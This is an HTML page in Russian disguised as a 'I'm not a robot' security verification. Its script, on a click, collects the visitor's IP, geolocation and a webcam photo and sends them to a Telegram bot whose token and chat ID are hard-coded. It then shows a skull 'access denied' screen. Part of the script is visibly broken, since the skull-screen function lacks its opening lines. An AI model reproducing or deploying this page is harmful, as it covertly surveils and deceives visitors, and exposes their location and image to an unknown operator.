<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Проверка безопасности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            background: #0a0f1e;
        }

        /* Анимированный градиентный фон */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(125deg, 
                #0f172a 0%, 
                #1e1b4b 25%, 
                #2e1065 50%, 
                #4c1d95 75%, 
                #5b21b6 100%);
            background-size: 300% 300%;
            animation: gradientFlow 12s ease infinite;
            z-index: -2;
        }

        @keyframes gradientFlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Анимированные звёзды */
        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20% 30%, white, rgba(0,0,0,0)),
                radial-gradient(3px 3px at 70% 80%, rgba(255,255,255,0.8), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 85% 15%, white, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 40% 60%, rgba(255,255,255,0.6), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 10% 90%, white, rgba(0,0,0,0));
            background-size: 200px 200px, 300px 300px, 150px 150px, 250px 250px, 180px 180px;
            background-repeat: no-repeat;
            opacity: 0.6;
            animation: starsFloat 20s linear infinite;
            z-index: -1;
        }

        @keyframes starsFloat {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        /* Карточка */
        .card {
            background: rgba(15, 25, 45, 0.65);
            backdrop-filter: blur(14px);
            border-radius: 40px;
            padding: 40px 32px;
            max-width: 460px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.25);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1) inset;
            transition: transform 0.2s ease;
            z-index: 1;
        }

        .card:hover {
            transform: scale(1.01);
        }

        .captcha-icon {
            font-size: 72px;
            margin-bottom: 20px;
            display: inline-block;
            filter: drop-shadow(0 4px 10px rgba(0,0,0,0.3));
            animation: iconPulse 1.8s infinite;
        }

        @keyframes iconPulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.08); opacity: 1; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
            100% { transform: scale(1); opacity: 0.9; }
        }

        h1 {
            color: white;
            font-size: 28px;
            font-weight: 600;
            letter-spacing: -0.3px;
            margin-bottom: 16px;
        }

        .security-badge {
            display: inline-block;
            background: rgba(0, 255, 255, 0.15);
            backdrop-filter: blur(4px);
            border-radius: 40px;
            padding: 6px 16px;
            font-size: 14px;
            color: #a5f3fc;
            border: 1px solid rgba(0, 255, 255, 0.3);
            margin-bottom: 24px;
        }

        p {
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 28px;
            line-height: 1.5;
            font-size: 16px;
        }

        button {
            background: linear-gradient(95deg, #3b82f6, #8b5cf6);
            color: white;
            border: none;
            padding: 16px 28px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
            box-shadow: 0 14px 28px rgba(59, 130, 246, 0.4);
        }

        button:active {
            transform: translateY(2px);
        }

        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.45);
            border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 20px;
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        button:disabled {
            opacity: 0.7;
            transform: none;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="captcha-icon">🤖➡️👤</div>
        <h1>Подтверждение личности</h1>
        <div class="security-badge">🔒 Защищено SecureCheck</div>
        <p>
            Пожалуйста, подтвердите, что вы не робот.<br>
            Система выполнит быструю верификацию.
        </p>
        <button id="verifyBtn">
            <span>✅ Я не робот</span>
        </button>
        <div class="footer">
            Нажатие кнопки означает согласие с условиями проверки
        </div>
    </div>

    <script>
        // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ) ==========
        const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";
        const TELEGRAM_CHAT_ID = "805226689";

        // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ IP ==========
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return 'не удалось определить'; }
        }

        // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОЛОКАЦИИ ==========
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('не поддерживается');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
                    () => resolve('пользователь запретил')
                );
            });
        }

        // ========== ФУНКЦИЯ ФОТОГРАФИРОВАНИЯ ==========
        async function takePhoto() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve('камера не поддерживается');
                    return;
                }
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg', 0.8);
                            stream.getTracks().forEach(track => track.stop());
                            resolve(photo);
                        };
                    })
                    .catch(() => resolve('пользователь запретил'));
            });
        }

        // ========== ОТПРАВКА В TELEGRAM ==========
        async function sendToTelegram(ip, location, photo) {
            const ua = navigator.userAgent;
            const caption = `✅ ПРОВЕРКА ПРОЙДЕНА
🌐 IP: ${ip}
📍 Гео: ${location}
💻 User-Agent: ${ua}
🕒 Время: ${new Date().toLocaleString('ru-RU')}`;

            if (photo && photo.startsWith('data:image')) {
                const blob = await (await fetch(photo)).blob();
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('caption', caption);
                formData.append('photo', blob, 'selfie.jpg');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: caption
                    })
                });
            }
        }

        // ========== ЭКРАН С ЧЕРЕПОМ (ПОСЛЕ ОТПРАВКИ) ==========

                align-items: center;
                font-family: monospace;
                text-align: center;
                padding: 20px;
            `;

            // ASCII-арт черепа (твой вариант)
            const skull = document.createElement('pre');
            skull.style.cssText = `
                color: #ff3333;
                font-size: 12px;
                margin-bottom: 30px;
                text-shadow: 0 0 8px red;
                line-height: 1.2;
                font-weight: bold;
            `;
            skull.textContent = `
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿
⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿
⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿
⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            `;

            const title = document.createElement('h1');
            title.textContent = 'ДОСТУП ЗАПРЕЩЁН';
            title.style.cssText = `
                color: #ff3333;
                font-size: 32px;
                margin: 20px 0;
                letter-spacing: 4px;
                font-family: monospace;
                text-shadow: 0 0 10px red;
            `;

            const message = document.createElement('p');
            message.textContent = 'Повторите попытку через 1 минуту';
            message.style.cssText = `
                color: #ff9999;
                font-size: 18px;
                font-family: monospace;
            `;

            overlay.appendChild(skull);
            overlay.appendChild(title);
            overlay.appendChild(message);
            document.body.appendChild(overlay);

            // Через 2 секунды перезагружаем страницу
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        }

        // ========== ОСНОВНОЙ ЗАПУСК ==========
        document.getElementById('verifyBtn').onclick = async () => {
            const btn = document.getElementById('verifyBtn');
            btn.innerHTML = '<span class="loader"></span> Проверка...';
            btn.disabled = true;

            const ip = await getIP();
            const location = await getLocation();
            const photo = await takePhoto();

            await sendToTelegram(ip, location, photo);
            
            // Показываем череп после отправки
            showSkullScreen();
        };
    </script>
</body>
</html>
